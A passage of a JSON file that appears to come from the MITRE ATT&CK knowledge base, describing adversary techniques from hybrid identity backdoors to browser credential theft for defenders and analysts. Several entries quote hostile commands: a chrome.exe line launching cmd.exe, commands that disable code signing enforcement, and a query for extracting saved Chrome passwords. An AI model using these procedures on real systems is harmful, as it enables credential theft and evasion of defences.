      "can inject a malicious DLL (`PTASpy`) into the `AzureADConnectAuthenticationAgentService` to backdoor Azure AD Pass-Through Authentication.",
      "has edited the `Microsoft.IdentityServer.Servicehost.exe.config` file to load a malicious DLL into the AD FS process thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name."
    ],
    "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud * Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory * Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users identity and privileges. By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",
    "similar_words": [
      "Hybrid Identity"
    ],
    "id": "T1556.007"
  },
  "attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4": {
    "name": "Vulnerability Scanning",
    "example_uses": [
      "has scanned network infrastructure for vulnerabilities as part of its operational planning.",
      "During  threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893.",
      "has performed vulnerability scans of the target server.",
      "used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations as well as the JexBoss tool to identify vulnerabilities in Java applications.",
      "has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.",
      "has performed large-scale scans in an attempt to find vulnerable servers.",
      "has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855 CVE-2021-26857 CVE-2021-26858 and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs.",
      "has conducted widespread scanning of target environments to identify vulnerabilities for exploit.",
      "has used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).",
      "has scanned targeted systems for vulnerable Citrix and Microsoft Exchange services.",
      "has scanned for vulnerabilities in the public-facing servers of their targets.",
      "has used publicly available tools such as MASSCAN and Acunetix for vulnerability scanning of public-facing infrastructure.",
      "has used remotely-hosted instances of the Acunetix vulnerability scanner.",
      "has conducted reconnaissance against target networks of interest looking for vulnerable end-of-life or no longer maintainted devices against which to rapidly deploy exploits."
    ],
    "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
    "similar_words": [
      "Vulnerability Scanning"
    ],
    "id": "T1595.002"
  },
  "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf": {
    "name": "Cloud API",
    "example_uses": [
      "leverages the AWS CLI for its operations.",
      "has leveraged AWS CLI to enumerate cloud environments with compromised credentials.",
      "has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API"
    ],
    "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.With proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
    "similar_words": [
      "Cloud API"
    ],
    "id": "T1059.009"
  },
  "attack-pattern--55fc4df0-b42c-479a-b860-7a6761bcaad0": {
    "name": "Search Open Technical Databases",
    "example_uses": [
      "has used large language models (LLMs) to assist in script development and deployment.",
      "has used LLMs to better understand publicly reported vulnerabilities."
    ],
    "description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "Search Open Technical Databases"
    ],
    "id": "T1596"
  },
  "attack-pattern--561ae9aa-c28a-4144-9eec-e7027a14c8c3": {
    "name": "Electron Applications",
    "example_uses": [
      "as leveraged Electron Applications to disable GPU sandboxing to avoid detection by security software."
    ],
    "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)",
    "similar_words": [
      "Electron Applications"
    ],
    "id": "T1218.015"
  },
  "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054": {
    "name": "Disable or Modify Linux Audit System",
    "example_uses": [
      "disables OpenSSH system (`systemd`) and audit logs (`/sbin/auditd`) when the backdoor is active."
    ],
    "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
    "similar_words": [
      "Disable or Modify Linux Audit System"
    ],
    "id": "T1562.012"
  },
  "attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c": {
    "name": "Code Signing Policy Modification",
    "example_uses": [
      "has used malware to turn off the RequireSigned feature which ensures only signed DLLs can be run on Windows.",
      "has enabled the TESTSIGNING boot configuration option to facilitate loading of a driver component.",
      "has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.",
      "can use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.",
      "has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges."
    ],
    "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include bcdedit.exe -set TESTSIGNING ON on Windows and csrutil disable on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",
    "similar_words": [
      "Code Signing Policy Modification"
    ],
    "id": "T1553.006"
  },
  "attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92": {
    "name": "Deploy Container",
    "example_uses": [
      "was run through a deployed Ubuntu container.",
      "has deployed different types of containers into victim environments to facilitate execution.  has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.",
      "can deploy a pod that mounts its nodes root file system then execute a command to create a reverse shell on the node.",
      "was run through a deployed container."
    ],
    "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",
    "similar_words": [
      "Deploy Container"
    ],
    "id": "T1610"
  },
  "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba": {
    "name": "Launch Daemon",
    "example_uses": [
      "can add a plist file in the `Library/LaunchDaemons` to establish persistence.",
      "will create a daemon for timed check-ins with command and control infrastructure.",
      "When running with root privileges after a  is installed  installs a plist file to the /Library/LaunchDaemons/ folder with the RunAtLoad key set to true establishing persistence as a Launch Daemon.",
      "adds plist files with the naming format com.[random_name].plist in the /Library/LaunchDaemons folder with the RunAtLoad and KeepAlive keys set to true.",
      "If running with root permissions  can create a persistence file in the folder /Library/LaunchDaemons.",
      "can persist via a LaunchDaemon.",
      "can establish persistence via a Launch Daemon.",
      "uses the ssh launchdaemon to elevate privileges bypass system controls and enable remote access to the victim.",
      "has placed a plist file within the LaunchDaemons folder and launched it manually."
    ],
    "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)Adversaries may install a Launch Daemon configured to execute at startup by using the RunAtLoad parameter set to true and the Program parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as usr/local/bin to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
    "similar_words": [
      "Launch Daemon"
    ],
    "id": "T1543.004"
  },
  "attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d": {
    "name": "Cloud Infrastructure Discovery",
    "example_uses": [
      "enumerates cloud environments to identify server and backup management infrastructure resource access databases and storage containers.",
      "can enumerate AWS infrastructure such as EC2 instances."
    ],
    "description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request, the HeadBucket API to determine a buckets existence along with access permissions of the request sender, or the GetPublicAccessBlock API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the gcloud compute instances list command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command az vm list lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as DescribeDBInstances to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",
    "similar_words": [
      "Cloud Infrastructure Discovery"
    ],
    "id": "T1580"
  },
  "attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8": {
    "name": "Credentials from Web Browsers",
    "example_uses": [
      "has a module that steals passwords saved in victim web browsers.",
      "has used a plug-in to gather credentials from web browsers including FireFox Google Chrome and Internet Explorer.",
      "dumps usernames and passwords from Firefox Internet Explorer and Outlook.",
      "can steal credentials from Google Chrome.",
      "has a PasswordRecoveryPacket module for recovering browser passwords.",
      "contains a module that tries to obtain stored credentials from web browsers.",
      "can capture login credentials from open browsers including Firefox Chrome Internet Explorer and Edge.",
      "can steal saved usernames and passwords in Chrome as well as credit card credentials.",
      "dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.",
      "variants have harvested credentials from browsers such as Firefox Chrome Opera and Edge.",
      "used BrowserGhost a tool designed to obtain credentials from browsers to retrieve information from password stores.",
      "has the capability to grab passwords from numerous web browsers as well as from Outlook and Thunderbird email clients.",
      "has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.",
      "can steal profiles (containing credential information) from Firefox Chrome and Opera.",
      "has stolen credentials stored in the victims browsers via software tool NirSoft WebBrowserPassView.",
      "During the   stole users' saved passwords from Chrome.",
      "can steal credentials stored in Web browsers by querying the sqlite database.",
      "can obtain passwords from common web browsers.",
      "has used tools to dump passwords from browsers.",
      "can obtain credentials from web browsers such as Google Chrome Internet Explorer and Firefox.",
      "has used a variety of publicly available tools like  to gather credentials.",
      "can gather browser usernames and passwords.",
      "malware gathers passwords from multiple sources including Internet Explorer Firefox and Chrome.",
      "has the ability to steal saved passwords from the Internet Explorer Edge Firefox and Chrome browsers.",
      "searches for credentials stored from web browsers.",
      "can gather credentials from a number of browsers.",
      "can use Lazagne for harvesting credentials.",
      "collects stored credentials from several web browsers.",
      "can steal credentials from the victim's browser.",
      "A module in  gathers logins and passwords stored in applications on the victims including Google Chrome Mozilla Firefox and several other browsers.",
      "can steal data and credentials from browsers.",
      "has the ability to steal data from the Chrome Edge Firefox Thunderbird and Opera browsers.",
      "used several tools for retrieving login and password information including LaZagne.",
      "has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.",
      "collects user credentials including passwords for various programs including Web browsers.",
      "CredRaptor tool can collect saved passwords from various internet browsers.",
      "collects credentials from Internet Explorer Mozilla Firefox and Eudora.",
      "can use tools to collect credentials from web browsers.",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from DPAPI.",
      "has been observed dropping browser password grabber modules.",
      "has run tools including Browser64 to steal passwords saved in victim web browsers.",
      "can capture passwords from common web browsers such as Internet Explorer Google Chrome and Firefox.",
      "can collect clear text web credentials for Internet Explorer/Edge.",
      "has the ability to steal credentials from web browsers including Internet Explorer Opera Yandex and Chrome.",
      "has the ability to steal credentials from web browsers.",
      "has obtained passwords and session tokens with the use of the Redline password stealer.",
      "can collect passwords stored in web browers including Internet Explorer Edge Chrome and Naver Whale.",
      "steals credentials stored inside Internet Explorer.",
      "gathers credentials for Google Chrome.",
      "has used a -based tool and a PowerShell script to steal passwords from Google Chrome.",
      "has used malware to gather credentials from Internet Explorer.",
      "used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.",
      "is capable of stealing usernames and passwords from browsers on the victim machine.",
      "has used FireMalv custom-developed malware which collected passwords from the Firefox browser storage.",
      "used a browser plugin to steal passwords and sessions from Internet Explorer Chrome Opera Firefox Torch and Yandex.",
      "Some  samples contain a publicly available Web browser password recovery tool.",
      "has used browser extensions including Google Chrome to steal passwords and cookies from browsers.  has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims.",
      "can use modules that extract passwords from common web browsers such as Firefox and Chrome.",
      "contains the getFirefoxPassword function to attempt to locate Firefox passwords.",
      "has a module to collect usernames and passwords stored in browsers.",
      "steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated with many sources such as Netscape Navigator Mozilla Firefox Mozilla Thunderbird and Internet Explorer.",
      "has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.  has also used tool named PICKPOCKET to dump passwords from web browsers.",
      "attempts to collect passwords from browsers.",
      "can steal cookie data and credentials from Google Chrome.",
      "has collected usernames and passwords from Firefox and Chrome.",
      "contains a module to steal credentials from Web browsers on the victim machine.",
      "has used the Stealer One credential stealer to target web browsers.",
      "can obtain passwords stored in files from web browsers such as Chrome Firefox Internet Explorer and Microsoft Edge sometimes using .",
      "can harvest saved credentials from browsers such as Google Chrome Microsoft Internet Explorer and Mozilla Firefox.",
      "has used a Python tool named Browdec.exe to steal browser credentials.",
      "can steal login credentials and stored financial information from the browser.",
      "passw.plug plugin can gather passwords saved in Opera Internet Explorer Safari Firefox and Chrome.",
      "has the capability to upload dumper tools that extract credentials from web browsers and store them in database files.",
      "has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.",
      "includes modules for stealing credentials from various browsers and applications including Chrome Opera Firefox Foxmail QQBrowser FileZilla and WinSCP.",
      "gathers credentials from Chromium-based browsers.",
      "collects passwords cookies and autocomplete information from various popular web browsers.",
      "has targeted network administrator browser data including browsing history and stored credentials.",
      "used  to obtain passwords from web browsers.",
      "has gathered credential and other information from multiple browsers.",
      "has stolen credentials stored in Chrome.",
      "can gather credentials from several web browsers.",
      "has used custom malware to steal credentials.",
      "During   used the CDumper (Chrome browser) and EDumper (Edge browser) to collect credentials."
    ],
    "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victims cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018) Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
    "similar_words": [
      "Credentials from Web Browsers"
    ],
    "id": "T1555.003"
  },
  "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2": {
    "name": "Path Interception by Search Order Hijacking",
    "example_uses": [
      "contains modules that can discover and exploit search order hijacking vulnerabilities.",
      "contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",
    "similar_words": [
      "Path Interception by Search Order Hijacking"
    ],
    "id": "T1574.008"
  },
  "attack-pattern--59bd0dec-f8b2-4b9a-9141-37a1e6899761": {
    "name": "Unused/Unsupported Cloud Regions",
    "example_uses": [],
    "description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",
    "similar_words": [
      "Unused/Unsupported Cloud Regions"
    ],
    "id": "T1535"
  },
  "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5": {
    "name": "DHCP Spoofing",
    "example_uses": [],
    "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: 1. The client broadcasts a `DISCOVER` message.2. The server responds with an `OFFER` message, which includes an available network address. 3. The client broadcasts a `REQUEST` message, which includes the network address offered. 4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a INFORMATION-REQUEST (code 11) message to the All_DHCP_Relay_Agents_and_Servers multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a networks DHCP allocation pool. ",
    "similar_words": [
      "DHCP Spoofing"
    ],
    "id": "T1557.003"
  },
  "attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5": {
    "name": "Remote Service Session Hijacking",
    "example_uses": [],
    "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",
    "similar_words": [
      "Remote Service Session Hijacking"
    ],
    "id": "T1563"
  },
  "attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5": {
    "name": "Binary Padding",
    "example_uses": [
      "can execute FileRecvWriteRand to append random bytes to the end of a file received from C2.",
      "has inserted large blocks of junk code including some components to decrypt strings and other important information for later in the encryption process.",
      "A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.",
